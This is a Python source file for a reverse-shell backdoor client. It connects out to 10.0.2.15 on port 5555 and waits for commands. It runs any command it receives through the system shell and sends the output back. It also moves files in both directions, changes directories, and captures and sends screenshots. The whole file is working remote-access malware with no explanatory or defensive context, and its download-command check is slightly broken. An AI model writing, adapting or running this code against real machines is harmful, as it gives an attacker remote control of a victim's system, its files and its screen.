import socket
import json
import subprocess
import os
import pyautogui


def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def receive():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    file = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    file.close()


def upload_file(file_name):
    file = open(file_name, 'rb')
    s.send(file.read())


def screenshot():
    screen = pyautogui.screenshot()
    screen.save('screen.png')


def shell():
    while True:
        command = receive()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[8:] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send(result.rstrip())


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.15', 5555))
shell()